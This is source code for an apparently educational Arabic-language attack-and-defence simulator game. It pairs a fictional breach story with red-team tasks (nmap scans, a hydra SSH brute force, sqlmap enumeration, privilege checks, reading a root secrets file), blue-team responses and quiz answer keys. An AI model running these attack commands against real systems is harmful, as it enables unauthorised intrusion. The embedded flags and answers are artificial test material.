import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Shield, Target, Terminal, BookOpen, PlayCircle, CheckCircle, Lock, Unlock,
    AlertTriangle, Flag, Trophy, Clock, Users, MessageSquare, Lightbulb,
    ChevronRight, ChevronLeft, Search, Eye, EyeOff, Network, Database,
    FileText, ShieldAlert, Zap, Skull, Crown, Sword, Castle,
    Radio, Wifi, Globe, Server, Activity, BarChart3, Star,
    TrendingUp, AlertCircle, CheckCircle2, HelpCircle, RotateCcw,
    Send, Map, Compass, Scan, RadioTower
} from 'lucide-react';
import { MatrixBackground } from '../ui/MatrixBackground';

const STORY = {
    title: 'عملية الفهد الأسود',
    subtitle: 'سيناريو اختراق حقيقي',
    description: 'تعرضت شركة "تقنية المستقبل" لهجوم سيبراني معقد. أنت مطلوب للتحقيق في الحادثة وإيقاف المهاجمين.',
    fullStory: 'شركة "تقنية المستقبل" هي شركة تقنية رائدة تدير بيانات حساسة لملايين المستخدمين. في الساعة 3:00 فجراً، اكتشف نظام المراقبة نشاطاً غير طبيعي على الخوادم الرئيسية. المدير التقني "م. خالد" استدعى فريق الطوارئ فوراً. أنت الآن جزء من هذه العملية — إما كمهاجم يختبر دفاعات الشركة (Red Team)، أو كمدافع يحمي الأنظمة من الاختراق (Blue Team). كل خطوة تتخذها ستحدد مصير العملية.',
    characters: {
        attacker_lead: { name: 'الظل (Shadow)', role: 'قائد فريق Red Team', avatar: '🦊' },
        defender_lead: { name: 'م. خالد', role: 'مدير SOC', avatar: '🛡️' },
        target_admin: { name: 'سارة', role: 'مديرة الخوادم', avatar: '👩‍💻' },
        ai_assistant: { name: 'نظام TAIF', role: 'مساعد ذكي', avatar: '🤖' }
    },
    phases: [
        {
            id: 'recon',
            title: 'الاستطلاع',
            description: 'جمع المعلومات عن الهدف',
            attackerObjective: 'اكتشاف نقاط الضعف في النظام',
            defenderObjective: 'اكتشاف نشاط الاستطلاع المشبوه',
            attackerStory: '🦊 الظل: "أول خطوة في أي عملية هي جمع المعلومات. لا تهاجم أبداً بدون معرفة عدوك. دعنا نكتشف ما نستطيع عن شركة تقنية المستقبل قبل أن نتحرك."',
            defenderStory: '🛡️ م. خالد: "تلقينا إنذاراً من نظام المراقبة عن استعلامات DNS غير طبيعية. شخص ما يجمع معلومات عنا. يجب أن نكتشف ماذا يحاول أن يعرف ونستعد."',
            xp: 100
        },
        {
            id: 'scanning',
            title: 'المسح',
            description: 'فحص الشبكة والخدمات',
            attackerObjective: 'تحديد المنافذ المفتوحة والخدمات',
            defenderObjective: 'اكتشاف وفهم أنماط المسح',
            attackerStory: '🦊 الظل: "ممتاز! الآن نعرف الهدف. حان وقت المسح — سنفحص الشبكة لنكتشف المنافذ المفتوحة والخدمات المشغلة. هذه هي الأبواب التي سندخل منها."',
            defenderStory: '🛡️ م. خالد: "👩‍💻 سارة أبلغتنا أن هناك حركة مرور كثيفة على عدة منافذ. يبدو أن المهاجم يقوم بمسح شامل. يجب أن نرصد هذا النشاط ونفهم ما يبحث عنه."',
            xp: 150
        },
        {
            id: 'exploitation',
            title: 'الاستغلال',
            description: 'استغلال الثغرات الأمنية',
            attackerObjective: 'الحصول على وصول أولي للنظام',
            defenderObjective: 'منع واكتشاف محاولات الاستغلال',
            attackerStory: '🦊 الظل: "وجدنا ثغرات! SSH مفتوح وقاعدة البيانات قابلة للحقن. حان وقت الاستغلال — سنحاول الدخول من أضعف نقطة. تذكر: المهاجم الذكي يستغل أضعف حلقة."',
            defenderStory: '🛡️ م. خالد: "🚨 إنذار أحمر! نظام Snort يكشف محاولات اختراق متعددة — هجوم Brute Force على SSH وحقن SQL على الموقع. يجب أن نتحرك بسرعة لإيقاف هذا الهجوم!"',
            xp: 200
        },
        {
            id: 'post_exploitation',
            title: 'ما بعد الاستغلال',
            description: 'الارتقاء في الصلاحيات والانتشار',
            attackerObjective: 'الوصول للنظام بأكمله والبقاء مستمراً',
            defenderObjective: 'احتواء الحادثة وإزالة الاختراق',
            attackerStory: '🦊 الظل: "دخلنا! لكن صلاحياتنا محدودة. الآن نحتاج رفع الصلاحيات للسيطرة الكاملة. ابحث عن أي طريقة للوصول لصلاحيات Root — هذا هو الهدف الحقيقي."',
            defenderStory: '🛡️ م. خالد: "المهاجم داخل النظام! 👩‍💻 سارة تقول هناك عمليات غريبة تعمل. يجب أن نحلل العمليات ونجد البرامج المشبوهة قبل أن يرفع صلاحياته."',
            xp: 250
        },
        {
            id: 'capture_flag',
            title: 'النهاية - Capture The Flag',
            description: 'المهمة النهائية',
            attackerObjective: 'سرقة ملف secrets.txt والهروب',
            defenderObjective: 'حماية الأصول واعتقال المهاجم',
            attackerStory: '🦊 الظل: "اللحظة الحاسمة! ملف الأسرار في /root/secrets.txt — إذا قرأناه تكون العملية ناجحة بالكامل. هذا هو العلم الأخير. اقرأه واخرج!"',
            defenderStory: '🛡️ م. خالد: "هذه المعركة الأخيرة! المهاجم يقترب من ملف الأسرار. يجب أن نغلق الصلاحيات فوراً ونحمي الملف قبل فوات الأوان! 👩‍💻 سارة: غيّري صلاحيات الملف حالاً!"',
            xp: 300
        }
    ]
};

const ATTACKER_TASKS = [
    {
        id: 1,
        phase: 'recon',
        title: 'جمع المعلومات العامة',
        command: 'whois future-tech.com',
        description: 'استخدم whois لجمع معلومات عن النطاق',
        hint: 'اكتب whois متبوعاً باسم النطاق',
        xp: 25,
        completed: false,
        story_context: '🦊 الظل: "قبل أي هجوم، نحتاج معرفة من نواجه. سنستخدم أداة whois لمعرفة تفاصيل تسجيل النطاق — من يملكه، متى سُجل، وما هي خوادم DNS الخاصة به."',
        flags: {
            easy: { question: 'ما اسم خادم DNS الذي ظهر في النتائج؟', answer: 'ns1.future-tech.com', xp: 10 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{dns_recon_001}', xp: 25 }
        },
        learning: {
            what: 'استخدمنا أداة whois للاستعلام عن معلومات تسجيل النطاق future-tech.com.',
            why: 'لأن معلومات Whois تكشف اسم المالك، البريد الإلكتروني، خوادم DNS، وتواريخ التسجيل. هذه المعلومات تساعد المهاجم في بناء خريطة أولية للهدف وقد تكشف عن نطاقات فرعية أو بنية تحتية إضافية يمكن استهدافها.'
        }
    },
    {
        id: 2,
        phase: 'recon',
        title: 'اكتشاف DNS',
        command: 'dig MX future-tech.com',
        description: 'اكتشف سجلات DNS للبريد الإلكتروني',
        hint: 'dig MX يعرض سجلات البريد',
        xp: 25,
        completed: false,
        story_context: '🦊 الظل: "ممتاز! الآن نحتاج معرفة خادم البريد. سجلات MX تكشف خوادم البريد الإلكتروني — وهذا قد يفتح لنا باباً للدخول عبر هجمات التصيد أو استغلال ثغرات البريد."',
        flags: {
            easy: { question: 'ما هو نوع السجل الذي استخدمناه لاكتشاف خادم البريد؟', answer: 'mx', xp: 10 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{mail_trace_002}', xp: 25 }
        },
        learning: {
            what: 'استخدمنا أداة dig مع نوع السجل MX لاكتشاف خوادم البريد الإلكتروني.',
            why: 'سجلات MX تكشف البنية التحتية للبريد. معرفة خادم البريد تساعد في تحديد مزود الخدمة وإصداره، مما قد يكشف عن ثغرات معروفة أو يساعد في تخطيط هجمات التصيد (Phishing).'
        }
    },
    {
        id: 3,
        phase: 'scanning',
        title: 'مسح المنافذ',
        command: 'nmap -sS 192.168.1.1',
        description: 'استخدم nmap لمسح المنافذ المفتوحة',
        hint: 'nmap -sS لمسح SYN stealth',
        xp: 50,
        completed: false,
        story_context: '🦊 الظل: "حان وقت المسح الحقيقي! سنستخدم مسح SYN Stealth — وهو مسح خفي لا يكمل الاتصال الكامل (3-way handshake) مما يجعل اكتشافنا أصعب. كل منفذ مفتوح هو باب محتمل للدخول."',
        flags: {
            easy: { question: 'ما رقم المنفذ الذي يشغل خدمة SSH؟', answer: '22', xp: 15 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{port_scan_003}', xp: 30 }
        },
        learning: {
            what: 'استخدمنا nmap مع خيار -sS (SYN Stealth Scan) لمسح المنافذ المفتوحة على الهدف.',
            why: 'مسح SYN يرسل حزمة SYN فقط دون إكمال الاتصال، مما يجعله أسرع وأصعب في الاكتشاف من المسح العادي. النتائج تكشف المنافذ المفتوحة (open) التي تشغل خدمات يمكن استغلالها.'
        }
    },
    {
        id: 4,
        phase: 'scanning',
        title: 'تحديد الخدمات',
        command: 'nmap -sV 192.168.1.1',
        description: 'حدد إصدارات الخدمات المشغلة',
        hint: 'nmap -sV لكشف الإصدارات',
        xp: 50,
        completed: false,
        story_context: '🦊 الظل: "وجدنا منافذ مفتوحة! لكن معرفة المنفذ وحده لا يكفي — نحتاج معرفة إصدار البرنامج المشغل على كل منفذ. الإصدارات القديمة غالباً ما تحتوي على ثغرات معروفة."',
        flags: {
            easy: { question: 'ما الخيار الذي يكشف إصدارات الخدمات في nmap؟', answer: '-sv', xp: 15 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{version_leak_004}', xp: 30 }
        },
        learning: {
            what: 'استخدمنا nmap مع خيار -sV (Version Detection) لتحديد إصدارات الخدمات على كل منفذ.',
            why: 'معرفة إصدار الخدمة (مثل Apache 2.4.41 أو OpenSSH 7.6) يسمح بالبحث في قواعد بيانات الثغرات (CVE) عن ثغرات معروفة لهذا الإصدار بالذات، وهو أساس مرحلة الاستغلال.'
        }
    },
    {
        id: 5,
        phase: 'exploitation',
        title: 'استغلال ثغرة SSH',
        command: 'hydra -l admin -P passwords.txt ssh://192.168.1.1',
        description: 'حاول كسر كلمة مرور SSH بالقوة الغاشية',
        hint: 'hydra للهجوم بالقوة الغاشية',
        xp: 75,
        completed: false,
        story_context: '🦊 الظل: "SSH مفتوح وإصداره قديم! سنستخدم Hydra — أداة هجوم القوة الغاشية — لتجربة آلاف كلمات المرور تلقائياً. إذا كان المسؤول يستخدم كلمة مرور ضعيفة، سندخل خلال دقائق."',
        flags: {
            easy: { question: 'ما كلمة المرور التي اكتشفها Hydra؟', answer: 'password123!', xp: 20 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{brute_ssh_005}', xp: 40 }
        },
        learning: {
            what: 'استخدمنا أداة Hydra لتنفيذ هجوم Brute Force على خدمة SSH مع اسم المستخدم admin وقائمة كلمات مرور.',
            why: 'هجوم القوة الغاشية يجرب كلمات مرور متعددة تلقائياً. كثير من الأنظمة تستخدم كلمات مرور ضعيفة أو افتراضية. هذا يوضح أهمية استخدام كلمات مرور قوية وتفعيل الحماية ضد Brute Force مثل fail2ban.'
        }
    },
    {
        id: 6,
        phase: 'exploitation',
        title: 'حقن SQL',
        command: "sqlmap -u 'http://192.168.1.1/login.php?id=1' --dbs",
        description: 'استخدم sqlmap لاكتشاف قواعد البيانات',
        hint: 'sqlmap --dbs لعرض قواعد البيانات',
        xp: 75,
        completed: false,
        story_context: '🦊 الظل: "الموقع يقبل معاملات في الرابط — علامة كلاسيكية لثغرة SQL Injection! سنستخدم sqlmap لحقن استعلامات خبيثة واستخراج قواعد البيانات. هذه واحدة من أخطر الثغرات في تطبيقات الويب."',
        flags: {
            easy: { question: 'ما اسم قاعدة البيانات الأهم التي ظهرت؟', answer: 'future_db', xp: 20 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{sql_inject_006}', xp: 40 }
        },
        learning: {
            what: 'استخدمنا أداة sqlmap لاكتشاف واستغلال ثغرة حقن SQL في صفحة تسجيل الدخول.',
            why: 'حقن SQL يسمح بإدخال أوامر قاعدة بيانات خبيثة عبر حقول الإدخال. خيار --dbs يستخرج أسماء جميع قواعد البيانات. هذا يوضح خطورة عدم فلترة مدخلات المستخدم وأهمية استخدام Prepared Statements.'
        }
    },
    {
        id: 7,
        phase: 'post_exploitation',
        title: 'الارتقاء للصلاحيات',
        command: 'sudo -l',
        description: 'تحقق من صلاحيات sudo المتاحة',
        hint: 'sudo -l لعرض الصلاحيات',
        xp: 100,
        completed: false,
        story_context: '🦊 الظل: "دخلنا النظام لكن كمستخدم عادي! الآن نحتاج رفع الصلاحيات (Privilege Escalation). الخطوة الأولى: نتحقق ما هي الأوامر التي يمكننا تشغيلها كـ root — أحياناً المسؤولون يتركون ثغرات في إعدادات sudo."',
        flags: {
            easy: { question: 'ما هو المبدأ الأمني الذي يقول أعطِ أقل صلاحيات ممكنة؟', answer: 'least privilege', xp: 25 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{priv_esc_007}', xp: 50 }
        },
        learning: {
            what: 'استخدمنا الأمر sudo -l لعرض الأوامر التي يمكن تنفيذها بصلاحيات المدير (root).',
            why: 'هذا الأمر يكشف إعدادات sudo الخاطئة. إذا سُمح لمستخدم عادي بتشغيل أوامر معينة كـ root (مثل cat أو vim)، يمكن استغلالها للحصول على shell بصلاحيات كاملة. هذا يوضح أهمية مبدأ أقل الصلاحيات (Least Privilege).'
        }
    },
    {
        id: 8,
        phase: 'capture_flag',
        title: 'سرقة العلم',
        command: 'cat /root/secrets.txt',
        description: 'اقرأ ملف الأسرار النهائي',
        hint: 'cat لعرض محتوى الملف',
        xp: 150,
        completed: false,
        story_context: '🦊 الظل: "هذه هي اللحظة الأخيرة! ملف secrets.txt في مجلد root يحتوي على بيانات سرية للغاية. إذا تمكنا من قراءته، تكون العملية ناجحة بالكامل. هل أنت مستعد؟"',
        flags: {
            easy: { question: 'ما هو العلَم (FLAG) الذي ظهر في الملف؟', answer: 'flag{black_panther_operation_complete}', xp: 30 },
            puzzle: { question: '🏴 ابحث عن الفلاق السري المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{final_ctf_008}', xp: 75 }
        },
        learning: {
            what: 'قرأنا ملف /root/secrets.txt الذي يحتوي على البيانات السرية باستخدام صلاحيات root.',
            why: 'الوصول لملفات root يثبت السيطرة الكاملة على النظام (Full System Compromise). في الواقع، هذا يعني أن المهاجم يستطيع قراءة وتعديل وحذف أي شيء. هذا السيناريو يوضح سلسلة الهجوم الكاملة من الاستطلاع حتى السيطرة.'
        }
    }
];

const DEFENDER_TASKS = [
    {
        id: 1,
        phase: 'recon',
        title: 'تحليل سجلات DNS',
        command: 'grep "query" /var/log/named.log',
        description: 'ابحث عن استعلامات DNS مشبوهة',
        hint: 'grep للبحث في السجلات',
        xp: 25,
        completed: false,
        story_context: '🛡️ م. خالد: "🤖 نظام TAIF أرسل تنبيهاً — هناك عدد غير طبيعي من استعلامات DNS. شخص ما يجمع معلومات عن نطاقاتنا. يجب أن نفحص سجلات DNS لنعرف بالضبط ماذا يبحث عنه."',
        flags: {
            easy: { question: 'ما الأداة التي استخدمناها للبحث في السجلات؟', answer: 'grep', xp: 10 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{dns_alert_101}', xp: 25 }
        },
        learning: {
            what: 'استخدمنا grep للبحث عن كلمة query في سجلات خادم DNS.',
            why: 'سجلات DNS تكشف استعلامات الاستطلاع. عندما يستخدم المهاجم أدوات مثل whois وdig، تظهر هذه الاستعلامات في السجلات. اكتشافها مبكراً يعطينا وقتاً للاستعداد وتعزيز الدفاعات.'
        }
    },
    {
        id: 2,
        phase: 'scanning',
        title: 'كشف المسح',
        command: 'tcpdump -i eth0 port 80',
        description: 'راقب حركة HTTP للكشف عن المسح',
        hint: 'tcpdump لمراقبة الشبكة',
        xp: 50,
        completed: false,
        story_context: '🛡️ م. خالد: "👩‍💻 سارة لاحظت زيادة في حركة المرور على المنفذ 80. يجب أن نلتقط الحزم ونحللها لنعرف ما إذا كان هذا مسح شبكي أم حركة طبيعية."',
        flags: {
            easy: { question: 'ما رقم المنفذ الذي راقبناه في هذه المهمة؟', answer: '80', xp: 15 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{packet_cap_102}', xp: 30 }
        },
        learning: {
            what: 'استخدمنا tcpdump لالتقاط حزم الشبكة على واجهة eth0 للمنفذ 80.',
            why: 'tcpdump يلتقط حركة المرور الشبكية بالتفصيل. يمكننا رؤية عناوين المصدر والوجهة وأنواع الحزم. أنماط المسح مثل SYN Scan تظهر كحزم SYN متكررة بدون إكمال الاتصال، مما يميزها عن الحركة الطبيعية.'
        }
    },
    {
        id: 3,
        phase: 'scanning',
        title: 'تحليل IDS',
        command: 'tail -f /var/log/snort/alert',
        description: 'راقب تنبيهات Snort IDS',
        hint: 'tail -f للمتابعة المستمرة',
        xp: 50,
        completed: false,
        story_context: '🛡️ م. خالد: "🤖 نظام TAIF: تم تفعيل قواعد Snort IDS بسبب أنماط مسح مشبوهة. يجب متابعة التنبيهات الحية لفهم نوع الهجوم وسرعته."',
        flags: {
            easy: { question: 'ما اسم نظام كشف التسلل الذي استخدمناه؟', answer: 'snort', xp: 15 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{ids_snort_103}', xp: 30 }
        },
        learning: {
            what: 'استخدمنا tail -f لمتابعة تنبيهات نظام كشف التسلل Snort بشكل مباشر.',
            why: 'Snort هو نظام IDS (Intrusion Detection System) يحلل الحزم ويطابقها مع قواعد معروفة للهجمات. خيار -f يعرض السجلات بشكل مباشر لحظة بلحظة، مما يسمح لفريق SOC بالاستجابة الفورية للتهديدات.'
        }
    },
    {
        id: 4,
        phase: 'exploitation',
        title: 'كشف الهجوم',
        command: 'grep "Failed password" /var/log/auth.log',
        description: 'ابحث عن محاولات تسجيل دخول فاشلة',
        hint: 'grep للبحث عن الأنماط',
        xp: 75,
        completed: false,
        story_context: '🛡️ م. خالد: "🚨 إنذار! نظام المصادقة يسجل محاولات فاشلة متكررة — هذا نمط هجوم Brute Force! يجب أن نحلل السجلات لتحديد عنوان IP المهاجم وعدد المحاولات."',
        flags: {
            easy: { question: 'ما اسم السجل الذي فحصناه لاكتشاف محاولات الدخول؟', answer: 'auth.log', xp: 20 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{brute_det_104}', xp: 40 }
        },
        learning: {
            what: 'بحثنا عن عبارة Failed password في سجل المصادقة auth.log لاكتشاف محاولات Brute Force.',
            why: 'سجل auth.log يسجل كل محاولة تسجيل دخول. العدد الكبير من المحاولات الفاشلة من نفس العنوان يدل على هجوم Brute Force. تحديد العنوان المهاجم هو الخطوة الأولى لحظره.'
        }
    },
    {
        id: 5,
        phase: 'exploitation',
        title: 'حظر IP',
        command: 'iptables -A INPUT -s 192.168.1.100 -j DROP',
        description: 'احظر عنوان IP المهاجم',
        hint: 'iptables -A INPUT -s IP -j DROP',
        xp: 75,
        completed: false,
        story_context: '🛡️ م. خالد: "وجدنا العنوان! 192.168.1.100 يحاول الاختراق. يجب حظره فوراً باستخدام جدار الحماية. كل ثانية تأخير تعني فرصة أكبر للمهاجم."',
        flags: {
            easy: { question: 'ما الإجراء الذي اخترناه للحزم (DROP أم REJECT)؟', answer: 'drop', xp: 20 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{fw_block_105}', xp: 40 }
        },
        learning: {
            what: 'أضفنا قاعدة في جدار الحماية iptables لإسقاط (DROP) جميع الحزم القادمة من عنوان المهاجم.',
            why: 'iptables هو جدار حماية Linux. قاعدة DROP تتجاهل الحزم بصمت (بدون رد)، مما يجعل المهاجم يظن أن الخادم أصبح غير متصل. هذا أفضل من REJECT الذي يرسل رداً يؤكد وجود الخادم.'
        }
    },
    {
        id: 6,
        phase: 'post_exploitation',
        title: 'تحليل العمليات',
        command: 'ps aux | grep suspicious',
        description: 'ابحث عن عمليات مشبوهة',
        hint: 'ps aux لعرض جميع العمليات',
        xp: 100,
        completed: false,
        story_context: '🛡️ م. خالد: "👩‍💻 سارة تقول أن استهلاك CPU ارتفع فجأة! المهاجم ربما زرع برنامجاً خبيثاً أو فتح Reverse Shell. يجب فحص جميع العمليات الجارية للبحث عن أي نشاط غريب."',
        flags: {
            easy: { question: 'ما الأمر الذي يعرض جميع العمليات؟', answer: 'ps aux', xp: 25 },
            puzzle: { question: '🏴 ابحث عن الفلاق المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{proc_hunt_106}', xp: 50 }
        },
        learning: {
            what: 'استخدمنا ps aux مع grep للبحث عن عمليات مشبوهة تعمل على النظام.',
            why: 'بعد الاختراق، المهاجمون يشغلون عمليات خبيثة (Reverse Shells, Cryptominers, Backdoors). الأمر ps aux يعرض جميع العمليات مع تفاصيلها. البحث عن أسماء غريبة أو استهلاك عالي يساعد في اكتشاف البرامج المزروعة.'
        }
    },
    {
        id: 7,
        phase: 'capture_flag',
        title: 'حماية الأصول',
        command: 'chmod 600 /root/secrets.txt',
        description: 'أغلق صلاحيات ملف الأسرار',
        hint: 'chmod 600 للقراءة فقط للمالك',
        xp: 150,
        completed: false,
        story_context: '🛡️ م. خالد: "المهاجم يقترب من ملف الأسرار! يجب تغيير صلاحياته فوراً — فقط root يجب أن يستطيع قراءته. 👩‍💻 سارة: هذه فرصتنا الأخيرة لحماية البيانات!"',
        flags: {
            easy: { question: 'ماذا تعني الصلاحية 600: قراءة-كتابة للمالك فقط. ما هي بالرمزية؟', answer: 'rw-------', xp: 30 },
            puzzle: { question: '🏴 ابحث عن الفلاق السري المخفي في مخرجات التيرمنال (FLAG{...})', answer: 'flag{lockdown_107}', xp: 75 }
        },
        learning: {
            what: 'غيّرنا صلاحيات ملف secrets.txt إلى 600 (قراءة وكتابة للمالك فقط).',
            why: 'الصلاحية 600 تعني rw------- أي أن المالك فقط (root) يستطيع القراءة والكتابة. هذا يمنع أي مستخدم آخر من الوصول للملف حتى لو حصل على صلاحيات داخل النظام. إدارة الصلاحيات هي خط الدفاع الأخير.'
        }
    }
];

const ENVIRONMENT_QUESTIONS = [
    {
        id: 1,
        question: 'ما هي أنظمة التشغيل المستهدفة في هذه البيئة؟',
        options: ['Windows Server 2019', 'Ubuntu 20.04', 'CentOS 8', 'كل ما سبق'],
        correct: 3,
        xp: 20
    },
    {
        id: 2,
        question: 'أي منفذ يجب أن تراقبه بشكل خاص؟',
        options: ['Port 80 (HTTP)', 'Port 443 (HTTPS)', 'Port 22 (SSH)', 'جميعها'],
        correct: 3,
        xp: 20
    },
    {
        id: 3,
        question: 'ما هي أداة IDS المستخدمة؟',
        options: ['Snort', 'Suricata', 'Zeek', 'OSSEC'],
        correct: 0,
        xp: 30
    }
];

export default function AttackSimulatorPro() {
    const [mode, setMode] = useState(null); // 'attacker' | 'defender'
    const [currentPhase, setCurrentPhase] = useState(0);
    const [currentTask, setCurrentTask] = useState(0);
    const [showIntro, setShowIntro] = useState(true);
    const [terminalInput, setTerminalInput] = useState('');
    const [terminalHistory, setTerminalHistory] = useState([]);
    const [completedTasks, setCompletedTasks] = useState([]);
    const [totalXP, setTotalXP] = useState(0);
    const [showNotes, setShowNotes] = useState(false);
    const [notes, setNotes] = useState('');
    const [discoveredFlags, setDiscoveredFlags] = useState([]);
    const [showQuestion, setShowQuestion] = useState(false);
    const [currentQuestion, setCurrentQuestion] = useState(0);
    const [timeElapsed, setTimeElapsed] = useState(0);
    const [showLearningModal, setShowLearningModal] = useState(false);
    const [learningData, setLearningData] = useState(null);
    const [showPhaseIntro, setShowPhaseIntro] = useState(false);
    const [showFullStory, setShowFullStory] = useState(false);
    const [showCompletion, setShowCompletion] = useState(false);
    const [flagInput, setFlagInput] = useState('');
    const [flagPuzzleInput, setFlagPuzzleInput] = useState('');
    const [solvedTaskFlags, setSolvedTaskFlags] = useState({}); // { taskId: { easy: true, puzzle: true } }
    const [flagError, setFlagError] = useState('');
    const [hoveredNode, setHoveredNode] = useState(null);
    const terminalRef = useRef(null);

    const phase = STORY.phases[currentPhase];
    const tasks = mode === 'attacker' ? ATTACKER_TASKS : DEFENDER_TASKS;
    const currentTasks = tasks.filter(t => t.phase === phase.id);
    const task = currentTasks[currentTask];

    // Network topology nodes
    const NETWORK_NODES = [
        { id: 'internet', label: 'الإنترنت', icon: '🌐', x: 50, y: 8, type: 'cloud', desc: 'WAN - شبكة خارجية' },
        { id: 'firewall', label: 'جدار الحماية', icon: '🛡️', x: 50, y: 25, type: 'security', desc: 'iptables Firewall', phase: 'exploitation' },
        { id: 'ids', label: 'Snort IDS', icon: '👁️', x: 80, y: 25, type: 'security', desc: 'نظام كشف التسلل', phase: 'scanning' },
        { id: 'webserver', label: 'Web Server', icon: '🌐', x: 30, y: 45, type: 'server', desc: 'Apache 2.4.41 - Port 80/443', phase: 'scanning' },
        { id: 'ssh', label: 'SSH Server', icon: '🔑', x: 50, y: 45, type: 'server', desc: 'OpenSSH 7.6 - Port 22', phase: 'exploitation' },
        { id: 'database', label: 'قاعدة البيانات', icon: '🗄️', x: 70, y: 45, type: 'database', desc: 'MySQL 5.7 - Port 3306', phase: 'exploitation' },
        { id: 'dns', label: 'DNS Server', icon: '📍', x: 20, y: 25, type: 'server', desc: 'ns1.future-tech.com', phase: 'recon' },
        { id: 'mail', label: 'Mail Server', icon: '📧', x: 15, y: 45, type: 'server', desc: 'SMTP - Port 25', phase: 'recon' },
        { id: 'secrets', label: 'secrets.txt', icon: '📄', x: 50, y: 70, type: 'target', desc: '/root/secrets.txt - TOP SECRET', phase: 'capture_flag' },
        { id: 'attacker', label: 'المهاجم', icon: '🦊', x: 90, y: 8, type: 'attacker', desc: 'Kali Linux - 192.168.1.100' },
    ];

    const NETWORK_LINKS = [
        { from: 'internet', to: 'firewall' },
        { from: 'firewall', to: 'webserver' },
        { from: 'firewall', to: 'ssh' },
        { from: 'firewall', to: 'database' },
        { from: 'internet', to: 'dns' },
        { from: 'dns', to: 'mail' },
        { from: 'ssh', to: 'secrets' },
        { from: 'database', to: 'secrets' },
        { from: 'attacker', to: 'internet' },
        { from: 'internet', to: 'ids' },
    ];

    const getNodeStatus = (node) => {
        if (!node.phase) return 'neutral';
        const phaseIndex = STORY.phases.findIndex(p => p.id === node.phase);
        if (phaseIndex < currentPhase) return 'compromised';
        if (phaseIndex === currentPhase) return 'active';
        return 'locked';
    };

    useEffect(() => {
        const timer = setInterval(() => setTimeElapsed(prev => prev + 1), 1000);
        return () => clearInterval(timer);
    }, []);

    const formatTime = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    const handleCommand = (command) => {
        const trimmedCommand = command.trim();
        let output = '';

        if (trimmedCommand === task?.command) {
            output = generateSuccessOutput(task);
            if (!completedTasks.includes(task.id)) {
                const newCompleted = [...completedTasks, task.id];
                setCompletedTasks(newCompleted);
                setTotalXP(prev => prev + task.xp);
                setDiscoveredFlags(prev => [...prev, `FLAG_${task.id}_${Math.random().toString(36).substr(2, 6).toUpperCase()}`]);

                // Reset flag inputs for new task
                setFlagInput('');
                setFlagPuzzleInput('');
                setFlagError('');
            }
        } else {
            output = generateErrorOutput(trimmedCommand);
        }

        setTerminalHistory(prev => [...prev,
        { type: 'input', content: `$ ${trimmedCommand}`, timestamp: new Date().toLocaleTimeString() },
        { type: 'output', content: output }
        ]);

        setTerminalInput('');
    };

    const handleEasyFlagSubmit = (taskObj) => {
        const answer = flagInput.trim().toLowerCase();
        const correctAnswer = taskObj.flags.easy.answer.toLowerCase();
        if (answer === correctAnswer) {
            setSolvedTaskFlags(prev => ({ ...prev, [taskObj.id]: { ...prev[taskObj.id], easy: true } }));
            setTotalXP(prev => prev + taskObj.flags.easy.xp);
            setFlagError('');
        } else {
            setFlagError('✘ إجابة خاطئة، حاول مرة أخرى!');
        }
    };

    const handlePuzzleFlagSubmit = (taskObj) => {
        const answer = flagPuzzleInput.trim().toLowerCase();
        const correctAnswer = taskObj.flags.puzzle.answer.toLowerCase();
        if (answer === correctAnswer) {
            setSolvedTaskFlags(prev => ({ ...prev, [taskObj.id]: { ...prev[taskObj.id], puzzle: true } }));
            setTotalXP(prev => prev + taskObj.flags.puzzle.xp);
            setFlagError('');
        } else {
            setFlagError('✘ ليست الإجابة الصحيحة، ابحث في التيرمنال!');
        }
    };

    const handleFlagContinue = (taskObj) => {
        // Show learning modal
        if (taskObj?.learning) {
            setLearningData({ task: taskObj, learning: taskObj.learning });
            setShowLearningModal(true);
        }
    };

    const handleCloseLearning = () => {
        setShowLearningModal(false);
        // Auto-advance to next task/phase
        const taskIndex = currentTasks.findIndex(t => t.id === learningData?.task?.id);
        if (taskIndex >= 0 && taskIndex < currentTasks.length - 1) {
            setCurrentTask(taskIndex + 1);
        } else {
            // Move to next phase
            if (currentPhase < STORY.phases.length - 1) {
                setCurrentPhase(prev => prev + 1);
                setCurrentTask(0);
                setShowPhaseIntro(true);
            } else {
                setShowCompletion(true);
            }
        }
    };

    const generateSuccessOutput = (task) => {
        const hiddenFlag = task.flags?.puzzle?.answer?.toUpperCase() || '';
        const outputs = {
            'whois': `Domain Name: FUTURE-TECH.COM\nRegistry Domain ID: 1234567890_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.registrar.com\nName Server: ns1.future-tech.com\nName Server: ns2.future-tech.com\nDNSSEC: unsigned\n--- ${hiddenFlag} ---\nStatus: Active`,
